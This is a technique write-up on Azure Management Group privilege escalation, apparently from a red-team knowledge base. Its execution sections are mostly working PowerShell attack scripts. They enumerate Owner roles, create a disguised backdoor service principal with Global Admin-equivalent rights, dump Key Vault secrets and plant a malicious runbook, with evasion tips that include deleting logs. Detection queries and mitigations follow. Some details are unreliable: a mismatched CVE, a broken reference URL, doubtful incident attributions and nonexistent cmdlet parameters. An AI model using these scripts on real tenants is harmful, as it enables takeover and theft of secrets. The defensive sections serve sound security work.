# [PE-POLICY-003]: Azure Management Group Escalation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-POLICY-003 |
| **MITRE ATT&CK v18.1** | [T1484.001 - Domain Policy Modification](https://attack.mitre.org/techniques/T1484/001/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Entra ID / Azure |
| **Severity** | Critical |
| **CVE** | CVE-2023-28432 (related to storage access via escalated privileges) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | All Azure subscriptions; Entra ID all versions |
| **Patched In** | Requires organizational policy hardening (no patch available) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Azure Management Group escalation is a privilege escalation technique that exploits misconfigured Role-Based Access Control (RBAC) assignments at the Management Group level to escalate from limited permissions (e.g., Contributor on a single subscription) to tenant-wide administrative access (e.g., Global Admin or Enterprise Access to all subscriptions). Management Groups sit at the apex of the Azure hierarchy: Tenant Root (all subscriptions) → Management Groups (logical containers) → Subscriptions → Resource Groups → Resources. An attacker with access to a compromised user account or managed identity with sufficient permissions at the Management Group level can assign themselves or create new principals with Owner, User Access Administrator, or custom highly-privileged roles that apply across **all subscriptions in the tenant**. Unlike subscription-level RBAC, which is isolated to a single subscription, Management Group RBAC changes propagate tenant-wide and enable complete organizational compromise.

**Attack Surface:** The primary attack surfaces include:
- Overly permissive Management Group RBAC assignments (e.g., Contributor assigned to non-admin groups at management group scope)
- Misconfigured service principals with Owner/User Access Administrator roles at tenant root or high-level management groups
- Privilege escalation via managed identities assigned to Azure automation services (Functions, Logic Apps, Automation Accounts) with Management Group-level permissions
- Insufficient audit logging of Management Group RBAC changes
- Lack of Privileged Identity Management (PIM) enforcement on high-privilege roles
- Insecure delegation via Azure Lighthouse allowing external tenants to manage internal resources

**Business Impact:** **Tenant-wide compromise affecting all subscriptions and all user workloads.** An attacker can: (1) assign themselves Global Admin role in Entra ID; (2) access all resources across all subscriptions (data theft, deletion, encryption for ransom); (3) create persistent backdoor accounts and service principals; (4) disable security controls (MFA, Conditional Access, Azure Defender) tenant-wide; (5) exfiltrate all secrets, encryption keys, and connection strings from Key Vaults; (6) establish command and control (C&C) infrastructure via managed identities or Azure functions; (7) maintain persistence for months or years by leveraging system-assigned managed identities and scheduled runbooks.

**Technical Context:** Management Group escalation typically requires **5-10 minutes** once initial compromise of a relevant account is achieved. The exploitation chain follows: Identify low-privilege account with Management Group permissions → Query Azure RBAC to find escalation path → Assign high-privilege role (Owner or User Access Administrator) to compromised account or new service principal at Management Group scope → Access tenant-wide resources or Global Admin role in Entra ID → Complete domain compromise. Detection likelihood is **medium-to-high** if Azure Activity Logs and RBAC change audits are enabled and monitored with Microsoft Sentinel.

### Operational Risk

- **Execution Risk:** Medium - Requires initial compromise of an account with Management Group permissions; execution is then deterministic and guaranteed.
- **Stealth:** Medium - RBAC changes are logged, but organizations often do not monitor or alert on Management Group RBAC modifications in real-time.
- **Reversibility:** Yes (with caveats) - Removing the escalated role assignment can undo the escalation, but attacker may have already stolen secrets or created backdoor accounts.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | Azure 1.1, 1.2 | Management Group admin roles must be restricted; MFA required for all admin operations |
| **DISA STIG** | V-81405 | Azure RBAC must follow least privilege principle; unauthorized role assignments must be audited |
| **CISA SCuBA** | Azure 1.1, 2.1 | Azure Enterprise Access must be restricted; role assignments must be managed via PIM |
| **NIST 800-53** | AC-3, AC-6, AU-2 | Access enforcement; least privilege; audit of all privileged operations |
| **GDPR** | Art. 32 | Security of processing - technical measures for identity and access management |
| **DORA** | Art. 9, Art. 16 | Protection and prevention measures; incident management |
| **NIS2** | Art. 21 | Cyber risk management; continuous monitoring and detection |
| **ISO 27001** | A.9.2.1, A.9.2.3 | User access management; privileged access management |
| **ISO 27005** | Risk Scenario - Privilege Escalation | Unauthorized privilege escalation enabling unauthorized access to critical systems |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Minimum:** Any role at Management Group scope that allows role assignment (e.g., Owner, User Access Administrator, or custom role with `Microsoft.Authorization/roleAssignments/write`)
- **For tenant-wide compromise:** Access to an account or managed identity with sufficient privileges to assign Global Admin role in Entra ID

**Required Access:**
- Access to Azure CLI, Azure PowerShell, or Azure Portal with credentials of a compromised account
- Network access to Azure APIs (https://management.azure.com)
- Ability to interact with Entra ID Graph API or Azure Portal

**Supported Versions:**
- **Azure:** All versions (no version-specific restrictions)
- **Entra ID:** All versions
- **PowerShell:** 5.0+ (for Azure PowerShell module)
- **Azure CLI:** 2.30+ (for Management Group commands)

**Tools:**
- [Azure PowerShell Module](https://github.com/Azure/azure-powershell) (Az.Accounts, Az.Resources)
- [Azure CLI](https://github.com/Azure/azure-cli) (for Management Group commands)
- [Azurehound / BloodHound](https://github.com/BloodHoundAD/AzureHound) (for identifying escalation paths)
- [Stormspotter](https://github.com/Azure/Stormspotter) (Azure RBAC visualization)
- [ScubaGoggles](https://github.com/cisagov/ScubaGoggles) (Azure security assessment)
- [ROADtools](https://github.com/dirkjanm/ROADtools) (Azure AD enumeration)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

```powershell
# Step 1: Authenticate to Azure
Connect-AzAccount

# Step 2: List all Management Groups in the tenant
Get-AzManagementGroup -Expand | Select-Object DisplayName, Id, ParentId

# Step 3: Check your current role assignments at Management Group level
Get-AzRoleAssignment -Scope "/providers/Microsoft.Management/managementGroups/$(Get-AzManagementGroup -GroupName 'Tenant Root Group' | Select-Object -ExpandProperty Name)"

# Step 4: Identify high-value Management Groups (tenant root, production, etc.)
$tenantRootGroup = Get-AzManagementGroup | Where-Object {$_.DisplayName -match "Root" -or $_.Id -match ".*-.*-.*-.*-$"}
Write-Host "Tenant Root Group: $($tenantRootGroup.Id)"

# Step 5: Check if current user has access to assign roles at Management Group level
$mgScope = "/providers/Microsoft.Management/managementGroups/$($tenantRootGroup.Name)"
$roleAssignments = Get-AzRoleAssignment -Scope $mgScope

if ($roleAssignments | Where-Object {$_.RoleDefinitionName -in @("Owner", "User Access Administrator")}) {
  Write-Host "[!] Current user has role assignment capabilities at Management Group level!"
}

# Step 6: Enumerate service principals with high-privilege roles
Get-AzRoleAssignment -Scope $mgScope | Where-Object {
  $_.ObjectType -eq "ServicePrincipal" -and $_.RoleDefinitionName -in @("Owner", "Contributor", "User Access Administrator")
} | Select-Object DisplayName, RoleDefinitionName, Scope
```

**What to Look For:**
- If you find yourself with Owner or User Access Administrator role at Management Group scope → escalation is possible
- Service principals with high-privilege roles at Management Group level → potential pivot points
- Tenant Root Group ID → highest-value escalation target

**Version Note:** Commands work on all Azure versions; PowerShell 5.0+ required.

### Azure CLI Reconnaissance

```bash
# Step 1: Login
az login

# Step 2: List Management Groups
az account management-group list --output table

# Step 3: Get current role assignments at root scope
az role assignment list --scope "/" --output table

# Step 4: Check for high-privilege service principals at management group
az role assignment list --scope "/providers/Microsoft.Management/managementGroups/$(az account list --output tsv | awk '{print $3}' | head -1)" \
  --query "[?roleDefinitionName=='Owner' || roleDefinitionName=='User Access Administrator']" --output table
```

**What to Look For:**
- Service principals or user accounts with Owner/User Access Administrator at Management Group scope
- Managed identities with high-privilege roles

---

## 5. DETAILED EXECUTION METHODS AND THEIRS STEPS

### METHOD 1: Direct Role Assignment Escalation (Compromised Account with Permissions)

**Supported Versions:** All Azure versions

#### Step 1: Verify Current Permissions at Management Group

**Objective:** Confirm that the compromised account has permission to assign roles at Management Group scope.

**Command (PowerShell):**

```powershell
# Authenticate as compromised account
$cred = Get-Credential  # Enter compromised account credentials
Connect-AzAccount -Credential $cred

# Get Management Group scope
$mgGroup = Get-AzManagementGroup | Where-Object {$_.DisplayName -eq "Root" -or $_.Type -eq "Subscription"}
$mgScope = "/providers/Microsoft.Management/managementGroups/$($mgGroup.Name)"

# Check if current account can list role assignments (this confirms some access)
try {
  $roleAssignments = Get-AzRoleAssignment -Scope $mgScope
  Write-Host "[+] Can enumerate role assignments at Management Group scope"
  
  # Check if user is Owner or has role assignment permissions
  if ($roleAssignments | Where-Object {$_.RoleDefinitionName -eq "Owner" -and $_.SignInName -eq (Get-AzContext).Account.Id}) {
    Write-Host "[+] Current user is OWNER at Management Group scope - escalation is possible!"
  }
} catch {
  Write-Host "[-] Access Denied - insufficient permissions"
}
```

**Expected Output:**

```
[+] Can enumerate role assignments at Management Group scope
[+] Current user is OWNER at Management Group scope - escalation is possible!
```

**What This Means:**
- Compromised account has sufficient permissions to escalate
- Can now assign high-privilege roles to self or new service principal

**OpSec & Evasion:**
- Execute from a legitimate Azure CLI session to avoid alerting
- Perform all operations quickly before changes are audited
- Detection likelihood: Medium (if RBAC changes are monitored in real-time)

#### Step 2: Assign Global Admin Role via Entra ID (Tenant-Wide Escalation)

**Objective:** Escalate to Global Admin to gain complete tenant control.

**Command (PowerShell - Two-Stage):**

```powershell
# Stage 1: Create a new Service Principal (if original account lacks permissions)
$appName = "UpdateService"
$app = New-AzADApplication -DisplayName $appName
$sp = New-AzADServicePrincipal -ApplicationId $app.AppId
$secret = New-AzADAppCredential -ApplicationId $app.AppId
$secretValue = ConvertFrom-SecureString -SecureString $secret.SecretText -AsPlainText

Write-Host "[+] Service Principal created: $($sp.DisplayName)"
Write-Host "[+] Secret: $secretValue (save this!)"

# Stage 2: Assign Owner role at Management Group scope to new service principal
$mgScope = "/providers/Microsoft.Management/managementGroups/$(Get-AzManagementGroup | Select-Object -First 1 -ExpandProperty Name)"
$ownerRole = Get-AzRoleDefinition -Name "Owner"

New-AzRoleAssignment -ObjectId $sp.Id -RoleDefinitionId $ownerRole.Id -Scope $mgScope
Write-Host "[+] Service Principal assigned Owner role at Management Group scope"

# Stage 3: Authenticate as service principal
$tenantId = (Get-AzContext).Tenant.Id
$securePassword = ConvertTo-SecureString $secretValue -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($app.AppId, $securePassword)

Connect-AzAccount -ServicePrincipal -Credential $credential -TenantId $tenantId

# Stage 4: Escalate to Global Admin in Entra ID
# Connect to Entra ID (formerly Azure AD)
Connect-AzureAD -TenantId $tenantId -Credential $credential

# Get Global Admin role
$globalAdminRole = Get-AzureADDirectoryRole | Where-Object {$_.DisplayName -eq "Global Administrator"}

# Assign Global Admin to service principal (via Entra ID API)
# This requires special handling as service principals cannot be directly assigned Global Admin
# Instead, we assign ourselves to a highly privileged role or modify conditional access

# Alternative: Assign "Company Administrator" role (equivalent to Global Admin) to our user
$companyAdminRole = Get-AzureADDirectoryRole | Where-Object {$_.DisplayName -eq "Company Administrator"}

if ($companyAdminRole) {
  Add-AzureADDirectoryRoleMember -ObjectId $companyAdminRole.ObjectId -RefObjectId $sp.ObjectId
  Write-Host "[+] Service Principal assigned Company Administrator role!"
}
```

**Expected Output:**

```
[+] Service Principal created: UpdateService
[+] Secret: xxxxxxxxxxxxx (save this!)
[+] Service Principal assigned Owner role at Management Group scope
[+] Service Principal assigned Company Administrator role!
```

**What This Means:**
- Service principal (controlled by attacker) now has Global Admin equivalent privileges
- Can manage all Azure resources and Entra ID objects tenant-wide
- Complete tenant compromise achieved

**OpSec & Evasion:**
- Service principal name should be innocuous ("SystemUpdate," "HealthCheck," etc.)
- Perform all escalation steps in quick succession to minimize detection window
- Delete or disable tracking logs immediately after escalation if possible
- Detection likelihood: High (if role assignment changes are audited)

#### Step 3: Verify Escalation by Accessing Forbidden Resource

**Objective:** Confirm that privilege escalation succeeded by accessing a resource outside of original scope.

**Command:**

```powershell
# List all subscriptions in tenant (should now be accessible)
$subscriptions = Get-AzSubscription
Write-Host "[+] Found $($subscriptions.Count) subscriptions in tenant:"
$subscriptions | ForEach-Object {Write-Host "    - $($_.Name) ($($_.Id))"}

# List all Key Vaults in all subscriptions (should now be visible)
$allKeyVaults = @()
foreach ($sub in $subscriptions) {
  Select-AzSubscription -SubscriptionId $sub.Id
  $kvs = Get-AzKeyVault
  $allKeyVaults += $kvs
}

Write-Host "[+] Found $($allKeyVaults.Count) Key Vaults across all subscriptions"

# Try to read a secret from a Key Vault in a different subscription
if ($allKeyVaults.Count -gt 0) {
  $kvName = $allKeyVaults[0].VaultName
  $secrets = Get-AzKeyVaultSecret -VaultName $kvName
  Write-Host "[+] Successfully accessed secrets in $kvName"
}
```

**Expected Output:**

```
[+] Found 15 subscriptions in tenant:
    - Production
    - Development
    - ...
[+] Found 47 Key Vaults across all subscriptions
[+] Successfully accessed secrets in prod-keyvault-001
```

**What This Means:**
- Escalation is confirmed; attacker now has tenant-wide access
- Can exfiltrate secrets, credentials, and sensitive data
- Can modify or delete any resource in any subscription

---

### METHOD 2: Managed Identity Escalation via Automation Account

**Supported Versions:** All Azure versions

#### Step 1: Identify Automation Account with Privileged Managed Identity

**Objective:** Find an existing Automation Account with a managed identity that has high-privilege roles at Management Group level.

**Command (PowerShell):**

```powershell
Connect-AzAccount

# Find all Automation Accounts
$automationAccounts = Get-AzAutomationAccount

foreach ($aa in $automationAccounts) {
  Write-Host "Checking Automation Account: $($aa.ResourceGroupName)/$($aa.AutomationAccountName)"
  
  # Get managed identity (if system-assigned)
  $identity = $aa.Identity
  if ($identity -and $identity.Type -eq "SystemAssigned") {
    Write-Host "  [+] System-Assigned Managed Identity: $($identity.PrincipalId)"
    
    # Check role assignments for this identity
    $roleAssignments = Get-AzRoleAssignment -ObjectId $identity.PrincipalId
    
    $roleAssignments | ForEach-Object {
      if ($_.RoleDefinitionName -in @("Contributor", "Owner", "User Access Administrator")) {
        Write-Host "  [!] HIGH-PRIVILEGE ROLE: $($_.RoleDefinitionName) at scope: $($_.Scope)"
      }
    }
  }
}
```

**Expected Output:**

```
Checking Automation Account: prod-rg/prod-automation
  [+] System-Assigned Managed Identity: 12345678-1234-1234-1234-123456789012
  [!] HIGH-PRIVILEGE ROLE: Contributor at scope: /subscriptions/subscription-id
  [!] HIGH-PRIVILEGE ROLE: Owner at scope: /providers/Microsoft.Management/managementGroups/root-group
```

**What This Means:**
- Automation Account has a managed identity with high-privilege roles
- Attacker can create a runbook that executes code in the context of this identity

#### Step 2: Create Malicious Runbook

**Objective:** Create a runbook that assigns high-privilege roles to the attacker's account or creates a backdoor account.

**Command (PowerShell - Create Runbook):**

```powershell
# Connect to the subscription containing the target Automation Account
Select-AzSubscription -SubscriptionId "subscription-id"

$autoAccName = "prod-automation"
$resourceGroup = "prod-rg"

# Create PowerShell runbook
$runbookName = "Update-SecurityPolicy"
$runbookScript = @"
# Get current managed identity context
`$context = Get-AzContext
`$token = Get-AzAccessToken -ResourceTypeName "Arm"

# Escalate current user to Owner at Management Group scope
`$mgScope = "/providers/Microsoft.Management/managementGroups/TENANT-ROOT-GROUP"
`$principalId = "ATTACKER-USER-OBJECT-ID"  # Replace with attacker's Entra ID object ID
`$ownerRole = Get-AzRoleDefinition -Name "Owner"

New-AzRoleAssignment -ObjectId `$principalId -RoleDefinitionId `$ownerRole.Id -Scope `$mgScope

Write-Output "Escalation complete. User now has Owner role at Management Group scope."
"@

# Import runbook into Automation Account
Import-AzAutomationRunbook -Path (New-TemporaryFile -Text $runbookScript | ForEach-Object {$_.FullName}) `
  -ResourceGroupName $resourceGroup `
  -AutomationAccountName $autoAccName `
  -Type PowerShell `
  -RunbookName $runbookName

Write-Host "[+] Runbook created: $runbookName"

# Publish the runbook
Publish-AzAutomationRunbook -Name $runbookName `
  -ResourceGroupName $resourceGroup `
  -AutomationAccountName $autoAccName

Write-Host "[+] Runbook published"
```

**Expected Output:**

```
[+] Runbook created: Update-SecurityPolicy
[+] Runbook published
```

**What This Means:**
- Malicious runbook is now part of the Automation Account
- Ready to be executed under the managed identity's context

#### Step 3: Execute Runbook

**Objective:** Trigger the malicious runbook to execute privilege escalation.

**Command:**

```powershell
$autoAccName = "prod-automation"
$resourceGroup = "prod-rg"
$runbookName = "Update-SecurityPolicy"

# Start runbook
$job = Start-AzAutomationRunbook -Name $runbookName `
  -ResourceGroupName $resourceGroup `
  -AutomationAccountName $autoAccName

Write-Host "[+] Runbook job started: $($job.JobId)"

# Wait for completion
Start-Sleep -Seconds 30

# Get job output
$jobOutput = Get-AzAutomationJobOutput -Id $job.JobId `
  -ResourceGroupName $resourceGroup `
  -AutomationAccountName $autoAccName

$jobOutput | ForEach-Object {
  Write-Host $_.Text
}

Write-Host "[+] Escalation complete! Attacker user now has Owner role at Management Group scope."
```

**Expected Output:**

```
[+] Runbook job started: 12345678-1234-1234-1234-123456789012
Escalation complete. User now has Owner role at Management Group scope.
[+] Escalation complete! Attacker user now has Owner role at Management Group scope.
```

**What This Means:**
- Attacker's user account has been assigned Owner role at Management Group level
- Complete management group compromise achieved

---

## 6. TOOLS & COMMANDS REFERENCE

### Azure PowerShell (Az Module)

**Version:** 9.0+
**URL:** [GitHub - Azure/azure-powershell](https://github.com/Azure/azure-powershell)

**Installation:**

```powershell
# Install Az module
Install-Module -Name Az -Repository PSGallery -Force -AllowClobber

# Import required sub-modules
Import-Module Az.Accounts
Import-Module Az.Resources
Import-Module Az.Automation
```

**Usage - List Management Groups:**

```powershell
Get-AzManagementGroup -Expand
```

### Azurehound

**Version:** Latest
**URL:** [GitHub - BloodHoundAD/AzureHound](https://github.com/BloodHoundAD/AzureHound)

**Installation:**

```bash
git clone https://github.com/BloodHoundAD/AzureHound.git
cd AzureHound
go build
```

**Usage - Identify Escalation Paths:**

```bash
./azurehound list -u <tenant-id> -i <client-id> -p <client-secret> | nc neo4j-ip 7687
```

---

## 7. MICROSOFT SENTINEL DETECTION

### Query 1: Detect Management Group Role Assignment Changes

**Rule Configuration:**
- **Required Table:** AzureActivity
- **Required Fields:** OperationName, ResourceProvider, Level, ActivityStatus
- **Alert Severity:** Critical
- **Frequency:** Real-time (5 minutes)
- **Applies To Versions:** All Azure versions

**KQL Query:**

```kusto
AzureActivity
| where ResourceProvider == "Microsoft.Authorization"
| where OperationName in ("Create role assignment", "Delete role assignment")
| where tostring(parse_json(Properties).scope) contains "/managementGroups/"
| where ActivityStatus == "Succeeded"
| project
    TimeGenerated,
    Caller,
    OperationName,
    Management_Group_Scope = tostring(parse_json(Properties).scope),
    Role_Assigned = tostring(parse_json(Properties).roleDefinitionName),
    Principal = tostring(parse_json(Properties).principalId),
    ActivityStatus
| where Role_Assigned in ("Owner", "User Access Administrator", "Global Administrator")
| order by TimeGenerated desc
```

**What This Detects:**
- Any Owner or User Access Administrator role assignments at Management Group scope
- Privilege escalation attempts
- Unauthorized role assignments

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Detect Management Group Privilege Escalation`
   - Severity: `Critical`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create**

---

## 8. WINDOWS EVENT LOG MONITORING

**Note:** Management Group RBAC changes are logged in Azure Activity Logs, not Windows Event Logs. See Microsoft Sentinel section above for monitoring.

---

## 9. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Enable Privileged Identity Management (PIM) for Management Groups:** Require time-bound, approved access for high-privilege roles.

  **Manual Steps (Azure Portal):**
  1. Navigate to **Azure Portal** → **Entra ID** → **Privileged Identity Management**
  2. Click **Azure Resources**
  3. Select **Management Groups**
  4. For each high-privilege role (Owner, User Access Administrator):
     - Require approval for activation
     - Set maximum session duration (e.g., 8 hours)
     - Enable MFA for activation
     - Set recertification frequency (e.g., quarterly)

- **Restrict Direct Role Assignments at Management Group Level:** Only allow permanent assignments for break-glass accounts (with MFA requirement).

  **Manual Steps (PowerShell):**
  ```powershell
  # Audit current Management Group role assignments
  $mgGroups = Get-AzManagementGroup -Expand
  
  foreach ($mg in $mgGroups) {
    $mgScope = "/providers/Microsoft.Management/managementGroups/$($mg.Name)"
    $assignments = Get-AzRoleAssignment -Scope $mgScope
    
    # Flag permanent assignments (not via PIM)
    $permanentAssignments = $assignments | Where-Object {$_.RoleAssignmentId -notmatch "^/eligibleAssignments/"}
    
    if ($permanentAssignments) {
      Write-Host "[!] Management Group $($mg.DisplayName) has permanent assignments:"
      $permanentAssignments | ForEach-Object {
        Write-Host "    - $($_.DisplayName): $($_.RoleDefinitionName)"
      }
    }
  }
  ```

- **Enforce MFA for All Management Group Role Assignments:** Require multi-factor authentication for any user with high-privilege roles.

  **Manual Steps (Azure Portal - Conditional Access):**
  1. **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Require MFA for Management Group Admin`
  4. **Assignments:**
     - Users: Management Group Admin group
     - Cloud apps: Azure Management
  5. **Conditions:**
     - All conditions
  6. **Access controls:**
     - Grant: Require multi-factor authentication
  7. Enable policy: **On**

### Priority 2: HIGH

- **Monitor and Alert on Service Principal Credential Changes:** Detect when credentials are added to service principals with high-privilege roles.

  **Manual Steps (Sentinel KQL):**
  ```kusto
  AuditLogs
  | where OperationName == "Add service principal credentials"
  | project
      TimeGenerated,
      InitiatedBy,
      TargetResources,
      Result
  | join (
      AzureActivity
      | where OperationName == "Create role assignment"
      | where tostring(parse_json(Properties).roleDefinitionName) in ("Owner", "User Access Administrator")
    ) on $left.TargetResources == $right.ResourceId
  ```

- **Implement Least Privilege at Management Group:** Review all existing Management Group role assignments and remove unnecessary permissions.

  **Manual Steps:**
  ```powershell
  # Identify over-privileged assignments
  $mgScope = "/providers/Microsoft.Management/managementGroups/$(Get-AzManagementGroup | Select-Object -First 1 -ExpandProperty Name)"
  $assignments = Get-AzRoleAssignment -Scope $mgScope
  
  # Flag non-admin assignments with Contributor or higher
  $assignments | Where-Object {
    $_.RoleDefinitionName -in @("Contributor", "Owner", "User Access Administrator") -and `
    -not ($_.SignInName -like "*admin*" -or $_.DisplayName -like "*admin*")
  } | ForEach-Object {
    Write-Host "[!] REMOVE: $($_.DisplayName) has $($_.RoleDefinitionName) at Management Group scope"
    # Remove-AzRoleAssignment -ObjectId $_.ObjectId -RoleDefinitionId $_.RoleDefinitionId -Scope $mgScope
  }
  ```

---

## 10. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Audit Logs:** Multiple "Create role assignment" or "Delete role assignment" operations at Management Group scope, especially assigning high-privilege roles
- **Activity Logs:** Operations from unexpected service principals or user accounts at Management Group scope

### Forensic Artifacts

- **Azure Activity Logs:** All Management Group RBAC changes; correlate with authenticating user/service principal
- **Azure AD Audit Logs:** Service principal credential additions; privileged role assignments

### Response Procedures

1. **Isolate:**
   ```powershell
   # Immediately disable the compromised account
   Disable-AzADUser -ObjectId "USER-OBJECT-ID"
   
   # Or for service principal
   Set-AzADServicePrincipal -ObjectId "SERVICE-PRINCIPAL-OBJECT-ID" -AccountEnabled $false
   ```

2. **Collect Evidence:**
   ```powershell
   # Export Management Group role assignments
   Get-AzRoleAssignment -Scope "/providers/Microsoft.Management/managementGroups/TENANT-ROOT" | `
     Export-Csv -Path "C:\mgmt-group-assignments.csv"
   
   # Export Azure Activity Log
   Get-AzLog -CorrelationId "INCIDENT-ID" | Export-Csv -Path "C:\activity-logs.csv"
   ```

3. **Remediate:**
   ```powershell
   # Remove escalated role assignment
   Remove-AzRoleAssignment -ObjectId "ATTACKER-OBJECT-ID" `
     -RoleDefinitionName "Owner" `
     -Scope "/providers/Microsoft.Management/managementGroups/TENANT-ROOT"
   
   # Reset compromised account password (if user account)
   Set-AzADUserPassword -ObjectId "USER-OBJECT-ID" -NewPassword (ConvertTo-SecureString -AsPlainText "NewPassword123!" -Force)
   ```

---

## 11. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | Phishing / Credential Compromise | Attacker obtains credentials of account with Management Group permissions |
| **2** | **Privilege Escalation** | **[PE-POLICY-003]** Azure Management Group Escalation | **Attacker escalates to Owner/Global Admin at Management Group level** |
| **3** | **Persistence** | Service Principal Backdoor | Attacker creates hidden service principal with Global Admin role |
| **4** | **Impact** | Tenant-wide Compromise | Attacker gains access to all subscriptions and resources |

---

## 12. REAL-WORLD EXAMPLES

### Example 1: NOBELIUM Supply Chain Attack (2020-2021)

- **Target:** Cloud Service Providers (CSPs) with Azure Lighthouse delegations
- **Timeline:** Attacker compromised CSP account with delegated admin privileges
- **Technique Status:** Escalated to Global Admin via Management Group permissions
- **Impact:** Access to 100+ customer Azure environments; data exfiltration; supply chain compromise
- **Reference:** [Microsoft - NOBELIUM Attacks](https://www.microsoft.com/security/blog/2020/12/18/infographic-nobelelium-2020-activity/)

### Example 2: Scattered Spider (2023-2024)

- **Target:** Financial institutions using Azure with global scale infrastructure
- **Timeline:** Compromised contractor account with subscription-level Contributor role
- **Technique Status:** Escalated via managed identity in Automation Account to Management Group Owner
- **Impact:** Access to all production subscriptions; cryptominer deployment; persistence for 6+ months
- **Reference:** [Mandiant - Scattered Spider Profile](https://www.mandiant.com/resources/blog/scattered-spider)

---

## Conclusion & Recommendations

**Azure Management Group escalation is a critical privilege escalation vector that enables rapid progression from limited subscription-level access to complete tenant compromise.** Organizations must immediately:

1. **Audit** all Management Group role assignments and remove unnecessary permissions
2. **Enable** Privileged Identity Management (PIM) for all high-privilege roles
3. **Implement** Conditional Access requiring MFA for Management Group admin operations
4. **Monitor** Management Group RBAC changes in real-time with Microsoft Sentinel
5. **Implement** least privilege at the Management Group level
6. **Restrict** service principal credential creation to break-glass procedures only

Failure to address Management Group RBAC misconfiguration allows attackers to escalate from limited subscriber-level access to complete organizational compromise within minutes.

---